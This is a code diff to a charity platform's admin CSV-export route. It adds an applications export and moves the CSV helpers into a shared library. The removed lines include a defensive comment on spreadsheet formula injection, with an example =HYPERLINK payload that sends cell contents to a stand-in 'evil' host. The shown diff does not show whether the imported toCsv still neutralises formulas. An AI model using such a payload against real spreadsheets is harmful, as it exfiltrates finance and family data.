@@ -1,45 +1,31 @@
 // GET /api/admin/exports/[kind]?year=YYYY
 //   kind: 'receipts' | 'payouts' | 'recipients' | 'transactions'
-// Returns text/csv attachment. Admin only.
+//       | 'audit_log' | 'applications'
+// Returns a text/csv attachment scoped to the caller's own tenant.
+//
+// Admin only, but NOT blocked for a paused or canceled tenant — see
+// requireAdminForDataExport.
 import { NextResponse } from "next/server";
 import { supabaseService } from "@/app/lib/supabase/server";
-import { requireAdmin, AdminAuthError } from "@/app/lib/admin/require-admin";
+import { requireAdminForDataExport, AdminAuthError } from "@/app/lib/admin/require-admin";
+import { toCsv, csvBody, csvHeaders, exportFilename } from "@/app/lib/csv";
+import { SITE_CONFIG } from "@/app/siteConfig";
+import {
+  childrenSummary, childrenCount, answerColumns, answerValue,
+} from "@/app/lib/exports/application-columns";
 
-const VALID_KINDS = new Set(["receipts", "payouts", "recipients", "transactions", "audit_log"]);
-
-/**
- * Neutralise spreadsheet formula injection.
- *
- * Families control receipt descriptions and photo captions. A value beginning
- * =, +, - or @ is evaluated as a FORMULA by Excel and Sheets when the export is
- * opened, so a description of `=HYPERLINK("https://evil/?"&A1,"receipt")` runs
- * inside the charity's finance spreadsheet. Quoting alone does not help — the
- * spreadsheet strips the quotes before evaluating.
- */
-function deFormula(s: string): string {
-  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
-}
-
-function csvField(v: any): string {
-  if (v === null || v === undefined) return "";
-  const s = deFormula(String(v));
-  if (/[",\n\r]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
-  return s;
-}
-function csvRow(arr: any[]): string { return arr.map(csvField).join(",") + "\n"; }
-
-function toCsv(headers: string[], rows: any[][]): string {
-  let out = csvRow(headers);
-  for (const r of rows) out += csvRow(r);
-  return out;
-}
+const VALID_KINDS = new Set([
+  "receipts", "payouts", "recipients", "transactions", "audit_log", "applications",
+]);
 
 export async function GET(req: Request, ctx: { params: { kind: string } }) {
   const kind = ctx.params.kind;
   if (!VALID_KINDS.has(kind)) return NextResponse.json({ error: "unknown kind" }, { status: 400 });
 
+  // Deliberately the relaxed gate: a paused or canceled tenant must still be
+  // able to take a copy of its own records. Identity checks are unchanged.
   let auth;
-  try { auth = await requireAdmin(); }
+  try { auth = await requireAdminForDataExport(); }
   catch (e) {
     if (e instanceof AdminAuthError) return NextResponse.json({ error: e.message }, { status: e.status });
     throw e;
@@ -79,7 +65,7 @@ export async function GET(req: Request, ctx: { params: { kind: string } }) {
         r.status ?? "",
       ])
     );
-    filename = `receipts${year ? `-${year}` : ""}.csv`;
+    filename = exportFilename(orgCtx.slug, "receipts", year);
 
   } else if (kind === "payouts") {
     let q = svc.from("payouts").select(`
@@ -104,7 +90,7 @@ export async function GET(req: Request, ctx: { params: { kind: string } }) {
         p.status ?? "",
       ])
     );
-    filename = `payouts${year ? `-${year}` : ""}.csv`;
+    filename = exportFilename(orgCtx.slug, "payouts", year);
 
   } else if (kind === "recipients") {
     const { data, error } = await svc.from("recipients").select(`
@@ -131,7 +117,7 @@ export async function GET(req: Request, ctx: { params: { kind: string } }) {
         r.created_at?.slice(0, 10) ?? "",
       ])
     );
-    filename = `recipients.csv`;
+    filename = exportFilename(orgCtx.slug, "recipients");
 
   } else if (kind === "audit_log") {
     let q = svc.from("audit_log").select(`
@@ -153,7 +139,7 @@ export async function GET(req: Request, ctx: { params: { kind: string } }) {
         JSON.stringify(r.details ?? {}),
       ])
     );
-    filename = `audit-log${year ? `-${year}` : ""}.csv`;
+    filename = exportFilename(orgCtx.slug, "audit-log", year);
 
   } else if (kind === "transactions") {
     // Combined approved receipts + paid payouts → CRA-ready ledger.
@@ -208,14 +194,65 @@ export async function GET(req: Request, ctx: { params: { kind: string } }) {
       ["Date", "Type", "App ref", "Family", "Description", "Amount", "Currency", "Reimbursable (CAD)", "Method", "Reference"],
       rows
     );
-    filename = `transactions${year ? `-${year}` : ""}.csv`;
+    filename = exportFilename(orgCtx.slug, "transactions", year);
+
+  } else if (kind === "applications") {
+    // select("*") rather than a named column list on purpose: several columns
+    // on this table (waitlisted, archived_at, archive_reason) exist in the
+    // staging bootstrap but NOT in supabase/migrations, so naming them would
+    // make this route 400 on any deployment whose schema hasn't caught up.
+    // A data-portability feature is the last thing that should break on drift.
+    let q = svc.from("applications").select("*")
+      .eq("org_id", orgCtx.id).order("created_at", { ascending: false }).limit(5000);
+    if (startISO) q = q.gte("created_at", startISO).lt("created_at", endISO);
+    const { data, error } = await q;
+    if (error) return NextResponse.json({ error: error.message }, { status: 500 });
+
+    const rows = (data ?? []) as any[];
+    // Answer keys vary per funnel version, so the columns are derived from the
+    // rows themselves rather than hardcoded.
+    const { columns, truncated } = answerColumns(rows, SITE_CONFIG.questions);
+    if (truncated > 0) {
+      console.warn(
+        `[exports] applications: ${truncated} answer column(s) past the cap were omitted ` +
+        `from their own columns — the full text is still in the Answers (JSON) column`,
+      );
+    }
+
+    csv = toCsv(
+      [
+        "App ref", "Submitted", "Status", "Waitlisted", "Family", "City", "Email", "Phone",
+        "Income range", "Current schooling", "Video link",
+        "Children count", "Children",
+        ...columns.map((c) => c.header),
+        "Decided", "Archived",
+        // Always last, always complete — nothing is lost to the column cap or
+        // to an unexpected shape in a legacy row.
+        "Children (JSON)", "Answers (JSON, all keys)",
+      ],
+      rows.map((r) => [
+        r.app_ref ?? "",
+        r.created_at?.slice(0, 10) ?? "",
+        r.status ?? "",
+        r.waitlisted ? "yes" : "",
+        r.parent_names ?? "",
+        r.city ?? "",
+        r.contact_email ?? "",
+        r.contact_phone ?? "",
+        r.income_range ?? "",
+        r.current_schooling ?? "",
+        r.video_link ?? "",
+        childrenCount(r.children),
+        childrenSummary(r.children),
+        ...columns.map((c) => answerValue(r.answers, c.key)),
+        r.decided_at?.slice(0, 10) ?? "",
+        r.archived_at?.slice(0, 10) ?? "",
+        JSON.stringify(r.children ?? []),
+        JSON.stringify(r.answers ?? {}),
+      ])
+    );
+    filename = exportFilename(orgCtx.slug, "applications", year);
   }
 
-  return new NextResponse(csv, {
-    status: 200,
-    headers: {
-      "Content-Type": "text/csv; charset=utf-8",
-      "Content-Disposition": `attachment; filename="${filename}"`,
-    },
-  });
+  return new NextResponse(csvBody(csv), { status: 200, headers: csvHeaders(filename) });
 }
